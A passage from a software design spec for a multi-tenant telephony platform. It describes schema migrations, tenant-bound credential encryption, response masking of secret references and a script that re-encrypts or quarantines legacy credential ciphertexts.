| `services/config/carriers.py` | `create_carrier`/`update_carrier` gain a required keyword `allow_pointer_schemes: bool` and a plaintext `auth_token: str \| None`, and run `auth_token_ref = resolve_api_key_input(auth_token, auth_token_ref, current_ref=<old row's auth_token_ref on update, None on create>, allow_pointer_schemes=allow_pointer_schemes)`. `update_carrier` reads the old row under `SELECT … FOR UPDATE` in the same transaction first, as `update_provider_config` does. Adds `public_carrier(row, *, masked: bool)` (`auth_token_ref` through `mask_enc`). The module docstring's claim that "returning auth_token_ref to a caller is fine" (`:8-10`) is replaced: an `enc:` ref is a bearer capability (lesson 43). | Round-4 finding 2: the fourth ref table. |
| `services/config/audit.py` | `_SECRET_REF_FIELDS` (`:27`) gains the plaintext input names `api_key`, `auth_token` and `credentials`, so a new plaintext credential field cannot reach `audit_log.old_value`/`new_value`. | The carriers plaintext input is a new way for a raw secret to reach the audit writer; the existing set only covers `*_ref` names. |
| `admin-ui/app/(console)/telephony/page.tsx` | The carrier form's `auth_token_ref` input gets the same treatment this row already specifies for `creds.auth_token`: a masked `"[stored]"` renders empty with the "Stored — type to replace" placeholder, an untouched field submits `"[stored]"`, and a typed value is sent as the new plaintext `auth_token`. | Carriers are edited on this page (`admin-ui/lib/api.ts` is the only other `auth_token_ref` caller), so masking carriers without this would show the literal `[stored]` text and 400 on save. |
| `services/config/routers/carriers.py` | List (`:35`), get, create and update return `public_carrier(..., masked=ref_mask_required(current_user))`. Create and update pass the literal `allow_pointer_schemes=is_platform_scoped(current_user)`. | Same masking and pointer rule as the other three tables; `is_platform_scoped` is already imported here. |
| `services/config/schemas.py` | `CarrierCreate`/`CarrierUpdate` gain `auth_token: SecretStr \| None = None` beside `auth_token_ref` (`:347-359`), mirroring `ProviderConfigCreate`'s `api_key`/`api_key_ref` pair (`:258`). | A client with no plaintext field could not store a new BYOC token once `enc:` input is refused. |
| `services/config/routers/telephony_configs.py` | List (`:35-39`), list-by-provider (`:60-71`), get (`:89-91`), create, update and set-default-outbound return `public_telephony_config(..., masked=ref_mask_required(current_user))`. Create and update pass the literal `allow_pointer_schemes=is_platform_scoped(current_user)`. | Same as above. vobiz's per-call lookup is a platform service account, so it stays unmasked. |
| `docs/setup.md` | Documents `TOOLEXEC_OAUTH_REDIRECT_URI` and `TOOLEXEC_OAUTH_{GOOGLE,ZOHO,MICROSOFT}_CLIENT_ID` / `_CLIENT_SECRET_REF`, plus the per-provider registration steps (redirect URI, scopes, Zoho multi-DC). Documents the release step `python -m services.toolexec.reencrypt_tenant_refs --dry-run`, then without `--dry-run --report <path>`, run straight after the toolexec rollout. Explains what a quarantined credential means for a tenant, and that `env:`/`k8s:` credential refs are now a platform-operator-only input: a tenant admin enters the plaintext key instead. | OQ1: the manual registration step needs a runbook. |
| `libs/config_sdk` secrets tests (new or extend), `services/toolexec/tests/test_reencrypt_tenant_refs.py` (new), `services/toolexec/tests/test_oauth.py` (new), `test_presets.py` (new), `services/toolexec/tests/` executor tests (extend), `services/conversation/tests/` policy-resolver and `api_exec_executor` tests (extend), `services/config/tests/test_provider_secret_input.py`, `test_provider_configs.py` and `test_telephony_configs.py` (extend), `services/config/tests/test_credential_masking.py` (new), `services/config/tests/test_carriers.py` (extend) | See Test plan. | |

Before writing the two new pages, the implementer must follow `admin-ui/AGENTS.md`: read `node_modules/next/dist/docs/`, because this Next.js version has breaking changes.

## Data

Place the following after the `api_chain_runs`/`api_side_effect_claims` block, so that `custom_apis` and `users` already exist.

```sql
-- ── oauth_connections — one per (tenant, provider); mutated in place ────────
-- Connect/reconnect upsert this row; disconnect nulls the refs and flips status.
-- Nothing soft-deletes it (deleted_at kept for the repo's partial-index
-- convention), so preset rows' composite FK never dangles and reconnect needs
-- no repoint. status='connected' <=> both refs present. Refs are tenant-bound
-- (enc:t1., AAD = this row's tenant_id); a legacy Fernet ref cannot be stored.
CREATE TABLE IF NOT EXISTS oauth_connections (
    id                 UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    tenant_id          UUID NOT NULL REFERENCES tenants(id),
    provider           TEXT NOT NULL CHECK (provider IN ('google','zoho','microsoft')),
    status             TEXT NOT NULL CHECK (status IN ('connected','reconnect_needed','disconnected')),
    account_label      TEXT,                      -- display only (email/name); never an auth input
    -- The provider's immutable subject id for the authorizing account (id_token
    -- 'sub' for Google/MS, ZUID for Zoho). Identity only, never an auth input,
    -- never returned by a route. Lets disconnect tell "revoke this grant" from
    -- "another tenant still holds the same grant" (round-4 finding 4). NULL on a
    -- row connected before this change, which is treated as "not shared".
    provider_sub       TEXT,
    scopes             TEXT[] NOT NULL DEFAULT '{}',
    accounts_server    TEXT,                      -- Zoho DC origin, allow-listed; NULL otherwise
    access_token_ref   TEXT CHECK (access_token_ref  IS NULL OR access_token_ref  LIKE 'enc:t1.%'),
    access_expires_at  TIMESTAMPTZ,
    refresh_token_ref  TEXT CHECK (refresh_token_ref IS NULL OR refresh_token_ref LIKE 'enc:t1.%'),
    connected_by       UUID REFERENCES users(id),
    created_at         TIMESTAMPTZ NOT NULL DEFAULT now(),
    updated_at         TIMESTAMPTZ NOT NULL DEFAULT now(),
    deleted_at         TIMESTAMPTZ,
    UNIQUE (id, tenant_id),                       -- target of custom_apis' composite FK
    CONSTRAINT oauth_connections_token_shape CHECK (
        (status = 'connected') =
        (access_token_ref IS NOT NULL AND refresh_token_ref IS NOT NULL AND access_expires_at IS NOT NULL))
);
-- Tenant-SCOPED (lesson 3): tenant B's connection can never block tenant A's.
CREATE UNIQUE INDEX IF NOT EXISTS oauth_connections_tenant_provider_key
    ON oauth_connections (tenant_id, provider) WHERE deleted_at IS NULL;
-- Deliberately NOT unique and NOT tenant-scoped: the shared-grant probe in
-- disconnect is the one query in this design that must cross tenants, and a
-- unique index here would let tenant B block tenant A from connecting the same
-- Google account (lesson 3).
CREATE INDEX IF NOT EXISTS idx_oauth_connections_provider_sub
    ON oauth_connections (provider, provider_sub)
    WHERE deleted_at IS NULL AND status = 'connected' AND provider_sub IS NOT NULL;

-- ── oauth_authorization_states — single-use, 10-minute, user-bound ─────────
-- state is stored only as sha256 hex; the raw value exists in the browser URL
-- and nowhere server-side. Uniqueness is tenant-scoped; state is 32 server-
-- random bytes, so no tenant can choose a colliding value either.
CREATE TABLE IF NOT EXISTS oauth_authorization_states (
    id                 UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    tenant_id          UUID NOT NULL REFERENCES tenants(id),
    user_id            UUID NOT NULL REFERENCES users(id),
    provider           TEXT NOT NULL CHECK (provider IN ('google','zoho','microsoft')),
    state_hash         TEXT NOT NULL,
    code_verifier_ref  TEXT NOT NULL CHECK (code_verifier_ref LIKE 'enc:t1.%'),
    scopes             TEXT[] NOT NULL,
    expires_at         TIMESTAMPTZ NOT NULL,
    consumed_at        TIMESTAMPTZ,
    created_at         TIMESTAMPTZ NOT NULL DEFAULT now(),
    UNIQUE (tenant_id, state_hash)
);

ALTER TABLE custom_apis ADD COLUMN IF NOT EXISTS oauth_connection_id    UUID;
ALTER TABLE custom_apis ADD COLUMN IF NOT EXISTS preset_key             TEXT;   -- NULL = hand-registered
ALTER TABLE custom_apis ADD COLUMN IF NOT EXISTS response_transform     JSONB;  -- preset-only; closed set of kinds
ALTER TABLE custom_apis ADD COLUMN IF NOT EXISTS idempotency_body_field TEXT
    CHECK (idempotency_body_field IS NULL OR idempotency_body_field ~ '^[A-Za-z_][A-Za-z0-9_]*$');
-- Preset-only; non-NULL makes the row two-call confirm-gated (AC22).
ALTER TABLE custom_apis ADD COLUMN IF NOT EXISTS confirmation_template TEXT;
-- Preset-only (round-4 finding 3): max successful dispatches of this row per
-- api_chain_runs.session_id. NULL = uncapped, which is every existing row.
ALTER TABLE custom_apis ADD COLUMN IF NOT EXISTS session_send_cap INTEGER
    CHECK (session_send_cap IS NULL OR session_send_cap > 0);
ALTER TABLE custom_api_params ADD COLUMN IF NOT EXISTS body_path TEXT
    CHECK (body_path IS NULL OR body_path ~ '^[A-Za-z_][A-Za-z0-9_]*(\.([A-Za-z_][A-Za-z0-9_]*|[0-9]{1,2}))*$');
CREATE INDEX IF NOT EXISTS idx_custom_apis_tenant_preset
    ON custom_apis (tenant_id, preset_key) WHERE deleted_at IS NULL AND preset_key IS NOT NULL;

-- Preset-only: prepended to a caller_id value ('yuviz_phone=' on gcal_find_booking).
ALTER TABLE custom_api_params ADD COLUMN IF NOT EXISTS value_prefix TEXT
    CHECK (value_prefix IS NULL OR value_prefix ~ '^[a-z_]{1,32}=$');
-- Preset-only sibling of value_prefix (round-4 finding 3): renders a caller_id
-- value as bare digits instead of '+<digits>', for WhatsApp providers whose
-- recipient field rejects the '+'. Both are shaped by the same CHECK below.
ALTER TABLE custom_api_params ADD COLUMN IF NOT EXISTS value_digits_only BOOLEAN
    NOT NULL DEFAULT false;

-- caller_id = server-side ANI (finding 2). Widening only: every live row keeps
-- satisfying both CHECKs, and DROP+ADD share one DO block (lessons 10, 13).
DO $$ BEGIN
  EXECUTE 'ALTER TABLE custom_api_params DROP CONSTRAINT IF EXISTS custom_api_params_source_check';
  EXECUTE $sql$ALTER TABLE custom_api_params ADD CONSTRAINT custom_api_params_source_check
    CHECK (source IN ('literal','caller','upstream','caller_id'))$sql$;
  EXECUTE 'ALTER TABLE custom_api_params DROP CONSTRAINT IF EXISTS custom_api_params_source_shape';
  EXECUTE $sql$ALTER TABLE custom_api_params ADD CONSTRAINT custom_api_params_source_shape CHECK (
        (source = 'literal'   AND literal_value IS NOT NULL AND upstream_api_id IS NULL)
     OR (source = 'caller'    AND upstream_api_id IS NULL)
     OR (source = 'upstream'  AND upstream_api_id IS NOT NULL AND upstream_json_path IS NOT NULL)
     OR (source = 'caller_id' AND literal_value IS NULL AND upstream_api_id IS NULL))$sql$;
  EXECUTE 'ALTER TABLE custom_api_params DROP CONSTRAINT IF EXISTS custom_api_params_value_prefix_shape';
  EXECUTE $sql$ALTER TABLE custom_api_params ADD CONSTRAINT custom_api_params_value_prefix_shape
    CHECK (value_prefix IS NULL OR source = 'caller_id')$sql$;
  EXECUTE 'ALTER TABLE custom_api_params DROP CONSTRAINT IF EXISTS custom_api_params_value_digits_shape';
  EXECUTE $sql$ALTER TABLE custom_api_params ADD CONSTRAINT custom_api_params_value_digits_shape
    CHECK (NOT value_digits_only OR source = 'caller_id')$sql$;
END $$;

-- Finding 1: no new legacy (non-tenant-bound) enc: ref can be written to
-- custom_apis.auth_config. NOT VALID, so this apply never fails or skips on
-- live legacy rows (lesson 13); reencrypt_tenant_refs converts them and then
-- runs VALIDATE CONSTRAINT, and convalidated=true is the cutover's checkable
-- end. Added only if absent, so re-applying schema.sql never drops a
-- validated constraint back to NOT VALID.
DO $$ BEGIN
  IF NOT EXISTS (SELECT 1 FROM pg_constraint
                  WHERE conname = 'custom_apis_auth_config_enc_bound'
                    AND conrelid = 'custom_apis'::regclass) THEN
    EXECUTE $sql$ALTER TABLE custom_apis ADD CONSTRAINT custom_apis_auth_config_enc_bound
      CHECK (auth_config::text !~ '"enc:(?!t1\.)') NOT VALID$sql$;
  END IF;
END $$;

-- One statement, so a failing ADD rolls back its DROP (lessons 10, 13).
-- No data is rewritten: every existing row has a non-new scheme and a NULL
-- oauth_connection_id, so both new CHECKs hold for live data.
DO $$ BEGIN
  EXECUTE 'ALTER TABLE custom_apis DROP CONSTRAINT IF EXISTS custom_apis_auth_scheme_check';
  EXECUTE $sql$ALTER TABLE custom_apis ADD CONSTRAINT custom_apis_auth_scheme_check
    CHECK (auth_scheme IN ('none','api_key','bearer','oauth2_client_credentials','oauth2_authorization_code'))$sql$;
  EXECUTE 'ALTER TABLE custom_apis DROP CONSTRAINT IF EXISTS custom_apis_oauth_connection_shape';
  EXECUTE $sql$ALTER TABLE custom_apis ADD CONSTRAINT custom_apis_oauth_connection_shape
    CHECK ((auth_scheme = 'oauth2_authorization_code') = (oauth_connection_id IS NOT NULL))$sql$;
  EXECUTE 'ALTER TABLE custom_apis DROP CONSTRAINT IF EXISTS custom_apis_oauth_connection_fk';
  EXECUTE $sql$ALTER TABLE custom_apis ADD CONSTRAINT custom_apis_oauth_connection_fk
    FOREIGN KEY (oauth_connection_id, tenant_id) REFERENCES oauth_connections(id, tenant_id)$sql$;
  -- The gate needs the arguments_hash that only side-effecting steps compute.
  EXECUTE 'ALTER TABLE custom_apis DROP CONSTRAINT IF EXISTS custom_apis_confirmation_shape';
  EXECUTE $sql$ALTER TABLE custom_apis ADD CONSTRAINT custom_apis_confirmation_shape
    CHECK (confirmation_template IS NULL OR side_effecting)$sql$;
  -- The cap counts dispatched sends, which only side-effecting rows record.
  EXECUTE 'ALTER TABLE custom_apis DROP CONSTRAINT IF EXISTS custom_apis_send_cap_shape';
  EXECUTE $sql$ALTER TABLE custom_apis ADD CONSTRAINT custom_apis_send_cap_shape
    CHECK (session_send_cap IS NULL OR side_effecting)$sql$;
END $$;

-- One DO block per table; each re-adds the existing values unchanged plus
-- 'confirmation_required'. The implementer copies the current value lists
-- verbatim from the api_chain_runs / api_chain_steps CREATE TABLEs
-- (schema.sql ~:955 and ~:976) and updates those inline CHECKs to match for
-- fresh DBs. Widening a CHECK cannot fail against live rows.
DO $$ BEGIN
  EXECUTE 'ALTER TABLE api_chain_runs DROP CONSTRAINT IF EXISTS api_chain_runs_status_check';
  EXECUTE $sql$ALTER TABLE api_chain_runs ADD CONSTRAINT api_chain_runs_status_check
    CHECK (status IN (<existing values>, 'confirmation_required'))$sql$;
END $$;
DO $$ BEGIN
  EXECUTE 'ALTER TABLE api_chain_steps DROP CONSTRAINT IF EXISTS api_chain_steps_status_check';
  EXECUTE $sql$ALTER TABLE api_chain_steps ADD CONSTRAINT api_chain_steps_status_check
    CHECK (status IN (<existing values>, 'confirmation_required'))$sql$;
END $$;
```

Preset rows are found by `(tenant_id, preset_key)`. Individual steps are identified by their fixed `name`, which is stable because preset rows are locked (OQ2). The existing tenant-scoped `custom_apis_tenant_name_key` is the uniqueness guarantee, and no new unique index is needed.

## Interfaces

**Environment (platform, OQ1).**
- `TOOLEXEC_OAUTH_REDIRECT_URI` is the console origin plus `/integrations/callback` (AMENDED from `/connectors/callback`; see the ConnectorsPanel row in Changes). It is the only redirect URI ever sent to a provider (AC5). No request model has a redirect field, and every model uses `extra="forbid"`. This exact path is registered at each provider's developer console, so it must not change after the registration runbook in `docs/setup.md` has been executed — doing so is a five-provider re-registration plus an app re-submission at Salesforce and HubSpot.
- `TOOLEXEC_OAUTH_<PROVIDER>_CLIENT_ID` is a plain value, and `TOOLEXEC_OAUTH_<PROVIDER>_CLIENT_SECRET_REF` is resolved by a module-level `CompositeSecretResolver()` in `oauth.py`, constructed the same way as `executor._platform_secret_resolver`. These env names are constants and take no tenant input, so lesson 37's resolver boundary is not crossed.
- Startup does not fail if these are unset. The provider is simply not listed.

**Tenant-bound ciphertext (finding 1)**
```python
# libs/config_sdk/secrets.py
TENANT_BOUND_PREFIX = "enc:t1."
class SecretTenantMismatch(ValueError): ...
def is_tenant_bound(ref: str | None) -> bool
def encrypt_tenant_secret(tenant_id: "str | uuid.UUID", plaintext: str) -> str
def decrypt_tenant_secret(tenant_id: "str | uuid.UUID", ref: str) -> str
```
- **Key:** `AESGCM(HKDF(SHA256(), length=32, salt=None, info=b"yuviz/enc-t1/tenant-bound").derive(urlsafe_b64decode(SECRET_ENCRYPTION_KEY)))`. It uses the same env var and raises the same `SecretEncryptionUnavailable` as `_fernet()`, so there is no new config. The HKDF `info` string separates this key from Fernet's use of the same key bytes.
- **Seal:** a 12-byte `os.urandom` nonce, then `AESGCM.encrypt(nonce, plaintext.encode(), aad)`. The ref is `"enc:t1." + urlsafe_b64encode(nonce + ciphertext_and_tag)`. An empty plaintext raises, as `encrypt_secret` does.
- **Associated data:** `b"yuviz:enc:t1|tenant:" + str(uuid.UUID(str(tenant_id))).encode()`. The tenant id is canonicalised because callers pass both `str` and asyncpg's UUID (`auth_schemes.py:69-74`), and a non-UUID raises `ValueError`.
- **Open:** a ref that is not `enc:t1.` raises `ValueError`. A tag mismatch (another tenant's ref, or a tampered one) or malformed base64 raises `SecretTenantMismatch("credential_ref_outside_tenant_namespace") from None`. No message ever contains the ref.
- **`decrypt_secret(ref)`** raises `ValueError` for an `enc:t1.` ref before it tries Fernet. The four services' shared `CompositeSecretResolver` therefore refuses every tenant-bound ref. It does not try to decrypt one.
- **Toolexec readers.** `resolve_tenant_ref(tenant_id, ref)` is the only reader. For `enc:`, it raises `ValueError("credential_ref_outside_tenant_namespace")` unless `is_tenant_bound(ref)`, then returns `decrypt_tenant_secret(tenant_id, ref)`. `env:` and `k8s:` keep today's `validate_tenant_ref` plus `_tenant_secret_resolver` path. `tenant_id` is always the DB row's own: `api["tenant_id"]` (`auth_schemes.py:170`) in `apply()`, and the `$1` of `oauth.access_token_for`/refresh/redeem. `oauth.py` reads the access, refresh and verifier refs through it. `_oauth2_client_credentials_token` already does.
- **Toolexec writers.** `validate_tenant_ref`'s `enc:` branch requires `is_tenant_bound(ref)` and a successful `decrypt_tenant_secret(tenant_id, ref)`, and discards the result. This runs at registration through `_validate_credential_ref`. Every server-side writer seals with `encrypt_tenant_secret(tenant_id, …)` under the path tenant that already passed awaited `assert_tenant_access`, or under the row's own tenant for refresh and update. The writers are `custom_apis._seal_auth_secrets`, `presets.apply_preset` (WhatsApp), `oauth.start_authorization` (verifier) and `oauth.complete_authorization` and refresh (access, refresh).
- **`custom_apis._seal_auth_secrets(tenant_id, auth_scheme, auth_config, auth_secrets, old_auth_config) -> dict`** runs for each field in `_CREDENTIAL_REF_FIELDS[auth_scheme]`:
  1. If the field is in `auth_secrets`, it is sealed into `auth_config[field]`. If `auth_config` also carries a value other than `"[stored]"` for that field, it raises `ValueError("credential_ref_ambiguous: <field>")`.
  2. Otherwise, if `auth_config[field] == "[stored]"`, it copies the field from `old_auth_config`. This is allowed only on update, only when `auth_scheme` equals the old row's scheme, and only when the old row has that field. Anything else raises `ValueError("credential_ref_not_a_reference: <field>")`.
  3. An `auth_secrets` key that is not a field of the scheme raises the same error.

  The result then goes through the unchanged `_validate_credential_ref`. On create, `tenant_id` is the path tenant. On update, it is `old["tenant_id"]`, as `:623` already uses. A client-pasted `enc:` value passes only if it is a tenant-bound ref for this very tenant. No response ever contains such a value, so in practice every new credential is entered as `auth_secrets`.
- **`custom_apis.public_custom_api(api: dict) -> dict`** returns a copy whose `auth_config` has every key ending in `_ref` replaced. A non-empty value becomes `"[stored]"`, and `"quarantined"` becomes `""`. This includes `env:`/`k8s:` pointers, because finding 1 asks for every `*_ref`. The params list is untouched, since it is already `_redact_sensitive_literals`'d. No route returns a `*_ref` value: custom-API list, get, create and update, and preset apply, all return it. `oauth_connections` refs were never selected by any route (`list_connections` uses an explicit column list).
- **Existing rows: `services/toolexec/reencrypt_tenant_refs.py`.**
  ```python
  async def reencrypt(dsn: str, *, dry_run: bool = False) -> tuple[dict, list[dict]]
  # counts: {"rebound": n, "quarantined_custom_apis": n, "quarantined_pointer_refs": n,
  #          "quarantined_config": {"provider_configs": n, "tool_provider_configs": n,
  #                                 "telephony_configs": n, "carriers": n},
  #          "remaining": n, "config_shared": n}
  # second element: one {"table","column","row_id","tenant_id","reason"} dict per quarantined
  #                 occurrence — ids only, never a ciphertext, a plaintext or a field value.
  def main() -> None
  # python -m services.toolexec.reencrypt_tenant_refs [--dry-run] [--report <path>]
  # exit 1 unless remaining == 0 AND config_shared == 0
  ```
  - It runs under the platform superuser `POSTGRES_DSN`, the same role as the schema apply, because it must see every tenant. Everything happens in one transaction, which starts with `LOCK TABLE custom_apis IN SHARE ROW EXCLUSIVE MODE` so that no create or update can interleave.
  - **Inventory:** every occurrence of a legacy ref (starts with `enc:`, not `enc:t1.`):
    - In `custom_apis.auth_config` fields `key_ref`, `token_ref`, `client_id_ref` and `client_secret_ref`, **including soft-deleted rows**, because the CHECK validates them too.
    - Also in **four** Config columns (round-4 finding 2 adds the fourth): `provider_configs.api_key_ref` (`tenant_id` may be NULL, meaning platform), `tool_provider_configs.api_key_ref`, every string value and list entry of `telephony_configs.credentials` that starts with `enc:`, and `carriers.auth_token_ref`. The `telephony_configs` scan is registry-independent, the same walk as `public_telephony_config`. Soft-deleted rows are included. The transaction's first statement takes `LOCK TABLE custom_apis, provider_configs, tool_provider_configs, telephony_configs, carriers IN SHARE ROW EXCLUSIVE MODE` — `SHARE ROW EXCLUSIVE`, not `SHARE`, because the script now **writes** the four Config tables, so no concurrent Config create or update can interleave either.
    - **The inventory is derived, not hand-listed (lesson 29).** The four Config columns are declared once as a module-level `_CONFIG_REF_COLUMNS: tuple[tuple[str, str, str], ...]` of `(table, column, kind)` where `kind` is `"scalar"` or `"jsonb_credentials"`, and both the scan and the quarantine writes iterate that tuple. A test asserts its length **and** its membership against a query of `information_schema.columns` for every `TEXT` column named `%_ref` or `credentials` on a tenant-scoped Config table, so a fifth ref column added later cannot be silently missed — this is exactly the omission that produced round-3 finding 2 and round-4 finding 2 (lesson 42).
    - **`env:`/`k8s:` in `custom_apis.auth_config` (round-4 finding 5)** are inventoried as a separate class and quarantined in place, counted as `quarantined_pointer_refs`. They are not re-encrypted: a pointer ref has no ciphertext to rebind, and from this deploy `validate_tenant_ref` refuses to write a new one. Config's own pointer rows are **not** touched (see Risks, accepted residual).
  - **Attribution:** occurrences are grouped by the exact ciphertext string. A Fernet token carries a random IV, so two independent encryptions never produce the same string, and an identical string in two places means one was copied from the other. A ciphertext is **rebound** only if every occurrence of it, across all five columns, belongs to one and the same non-NULL tenant.
  - **"Ownership cannot be attributed" — exactly what that means, and why it is always the answer for a shared ciphertext.** When a ciphertext's occurrences span two or more distinct `tenant_id`s (or any occurrence sits on a platform row, `provider_configs.tenant_id IS NULL`), the script does **not** try to name the original, and uses no heuristic. The reason is that this database holds no evidence that dates a ciphertext's arrival in a row: `created_at` dates the row, not the credential, and a rotation rewrites the column in place; `updated_at` moves for any unrelated field edit; and the audit log cannot date it either, because `audit._redact` has always stripped `api_key_ref` and `auth_token_ref` from `old_value`/`new_value` (`services/config/audit.py:27-33`), so no audit row has ever contained one of these values. Guessing "oldest row wins" would therefore silently leave a live cross-tenant credential in place whenever the guess is wrong, which is the finding. So **every** occurrence is quarantined — the copier's row and the original holder's row alike. That is the right outcome either way: a ciphertext that exists in two tenants is compromised for both, and the original holder has to rotate regardless of who copied whom. Rebinding is `decrypt_secret`, then `encrypt_tenant_secret(<that row's tenant_id>, plaintext)`, written with `UPDATE custom_apis SET auth_config = jsonb_set(auth_config, ARRAY[$3], to_jsonb($5::text)) WHERE id = $1 AND tenant_id = $2 AND auth_config->>$3 = $4`. `$4` is the exact old string, and zero rows aborts the transaction.
  - **Quarantine:** a ciphertext found under two or more tenants (in any of the five columns), found in a platform `provider_configs` row, or failing to decrypt under the current key is quarantined — in **every** occurrence, Config rows included (round-4 finding 1). A quarantined value is never decrypted.
    - **The written value is the literal `"quarantined"`, in all five columns.** Not NULL: all three `*_ref` columns are nullable `TEXT` (`schema.sql:48,196,449`), but NULL reads as "no credential configured" and some callers then proceed with `None` (`services/did/provider_manager.py:92-93`), which is a silent degradation rather than a stop. `"quarantined"` has no scheme, so `CompositeSecretResolver.resolve` raises `ValueError("unrecognized secret ref scheme …")` (`libs/config_sdk/secret_resolver.py:96-99`), `services/telephony/accounts.py:138`'s direct `decrypt_secret` raises, and toolexec's `resolve_tenant_ref` rejects it. Every reader fails closed and loudly, and nothing is sent to a carrier or a provider. Writing a literal rather than NULL also keeps `telephony_configs.credentials` in its provider-registry shape, scalar entry or list entry, so no shape validation breaks on the next read.
    - **Each write is a conditional `UPDATE … WHERE id = $1 AND <column> = $2` (lesson 8)**, `$2` being the exact old string — for `telephony_configs` the predicate is the whole old `credentials` jsonb, and the new value is the fully rewritten document, because one document can hold several affected entries. Zero rows anywhere aborts the whole transaction, which rolls back every rebind and every quarantine.
    - **Audit:** each quarantined occurrence writes `audit.write_audit(entity_type=<"custom_api"\|"provider_config"\|"tool_provider_config"\|"telephony_config"\|"carrier">, entity_id=<row id>, action="updated", details={"reason": "credential_quarantined_shared_ciphertext"\|"credential_quarantined_undecryptable"\|"credential_quarantined_pointer_ref", "field": <column or credentials key>})` on that row's own tenant, so each affected tenant has a record in its own audit log. A platform `provider_configs` row has no tenant to audit; it appears in the report file only.
  - **What the operator sees.** stdout stays counts-only, with no ids, ciphertexts or plaintexts, so it is safe in CI logs. `--report <path>` writes the second return value as JSON Lines, `0600`, **after** the transaction commits (so a rolled-back run leaves no misleading file): one line per quarantined occurrence with `table`, `column`, `row_id`, `tenant_id` and `reason`. That is the side channel the operator uses to tell each affected tenant which credential to rotate. `config_shared` is now the number of distinct shared ciphertexts **still live after the action**, which is `0` on any successful run, and `main` exits 1 if it is not — so the release gate is a value the operator can read, not a promise.
  - **Blast radius of quarantining Config rows.** Only ciphertexts that occur under two or more tenants are touched, and by the argument above every one of those is a copy. A single-tenant Config credential is never quarantined, because an independently-encrypted Fernet value cannot collide. A tenant whose row is quarantined sees the field as `"[stored]"`-free and empty in the console (the mask returns `""` for a quarantined field, as it already does for `custom_apis`), the integration fails closed, and the admin re-enters the key as plaintext.
  - The script then runs `ALTER TABLE custom_apis VALIDATE CONSTRAINT custom_apis_auth_config_enc_bound` in the same transaction. If any legacy ref survived, VALIDATE fails, the whole transaction rolls back and `main` exits 1. `--dry-run` reports the counts and rolls back. A second run finds nothing and re-validates as a no-op. The output is counts only, with no plaintext, ciphertext or ids.
  - **How the window closes:** there is no window. From the deploy of this change, toolexec never decrypts a legacy ref, at write time or at call time. Until the script runs, a legacy row fails closed with `credential_unavailable`. It is never decrypted under the wrong tenant. The script runs straight after the toolexec rollout (runbook, `docs/setup.md`). `pg_constraint.convalidated = true` on `custom_apis_auth_config_enc_bound` is the verifiable end state, and after that the database itself rejects any legacy write, even one from a future code path that skips `_validate_credential_ref`.
  - `oauth_connections` and `oauth_authorization_states` are new tables, so they have no legacy rows, and their `LIKE 'enc:t1.%'` CHECKs hold from the first insert.

**Config credential tables (round-3 finding 2; round-4 findings 2 and 5)** (`services/config/provider_configs.py`, `telephony_configs.py`, `tool_provider_configs.py`, `carriers.py` — **four** tables, not three):
```python
STORED_SENTINEL = "[stored]"
def resolve_api_key_input(api_key: str | None, api_key_ref: str | None, *,
                          current_ref: str | None = None,
                          allow_pointer_schemes: bool) -> str | None     # keyword is REQUIRED, no default
def ref_mask_required(user: CurrentUser) -> bool    # not (user.is_service_account and user.tenant_id is None)
def mask_enc(value: str | None) -> str | None       # "enc:…" -> "[stored]"; "quarantined" -> ""; env:/k8s:/None unchanged
def public_provider_config(cfg: dict, *, masked: bool) -> dict          # copy; api_key_ref through mask_enc
def public_telephony_config(cfg: dict, *, masked: bool) -> dict         # copy; every enc: string in credentials masked
def public_carrier(cfg: dict, *, masked: bool) -> dict                  # copy; auth_token_ref through mask_enc
```
- **`carriers` is the fourth table (round-4 finding 2).** It stores `auth_token_ref` verbatim today, returns it unmasked to every console role on list (`routers/carriers.py:35`), get and update (`:58`), and `services/did/provider_manager.py:92` resolves it through the shared `secret_resolver` with no tenant binding — the identical capability-replay shape as the other three (lesson 43). It gets the identical treatment: `resolve_api_key_input(auth_token, auth_token_ref, current_ref=old["auth_token_ref"], allow_pointer_schemes=…)` on update (after a `SELECT … FOR UPDATE` of the old row in the same transaction) and with `current_ref=None` on create, `public_carrier(..., masked=ref_mask_required(current_user))` on every route that returns a row, and `carriers.auth_token_ref` in the re-encryption script's inventory and quarantine action. The module docstring's standing claim that returning `auth_token_ref` is fine (`services/config/carriers.py:8-10`) was true only while every value was an `env:` pointer; it is false for an `enc:` ciphertext, and it is rewritten.
- **Carriers needs a plaintext input.** Today `CarrierCreate`/`CarrierUpdate` accept only `auth_token_ref` (`schemas.py:347-359`). Once client `enc:` is refused and `env:` is platform-only, a tenant admin would have no way to store a BYOC token at all, so both models gain `auth_token: SecretStr | None = None`, mirroring `ProviderConfigCreate`'s existing `api_key`/`api_key_ref` pair. `create_carrier`/`update_carrier` gain the matching `auth_token` parameter and seal it with the same `encrypt_secret` path the other tables use. `carrier_account_ref` is **not** a secret (it is the Twilio account SID, passed to the provider as an identifier and never resolved through `secret_resolver`), so it is left alone; the inventory tripwire above is what keeps that judgement honest if it ever changes.
- **Pointer schemes are platform-only (round-4 finding 5).** `resolve_api_key_input` raises the same `ValueError("credential_ref_not_accepted: send the key as api_key")` for an `env:`- or `k8s:`-prefixed value when `allow_pointer_schemes` is false. The keyword is **required and has no default**, so no call site can inherit a permissive value by forgetting it, and exactly one expression may feed it: the literal `allow_pointer_schemes=is_platform_scoped(current_user)` written at each create/update route in `routers/provider_configs.py`, `routers/tool_provider_configs.py`, `routers/telephony_configs.py` and `routers/carriers.py` (lesson 32 — the literal call expression is specified at the site that must satisfy it, not only in prose). `deps.is_platform_scoped` is `tenant_id is None`, which is the scoping question, not the privilege question (lesson 24): a tenant-scoped superadmin is refused, and a platform service account or a platform operator is allowed. `telephony_configs._normalize_one` applies the same rule per credentials entry. **Reads are unchanged**, so every live `env:`/`k8s:` row keeps resolving and nothing breaks at deploy.
- **`custom_apis.auth_config` takes no pointer at all.** Every `custom_apis` row has a NOT NULL `tenant_id` and is written only by tenant-scoped console routes and by preset apply, so there is no principal for whom a pointer is legitimate. `auth_schemes.validate_tenant_ref` therefore accepts only `enc:t1.`, and `env:`/`k8s:` are rejected at write time with the existing 400. The read branch is left intact until the script quarantines the existing rows, so nothing fails between deploy and the script.
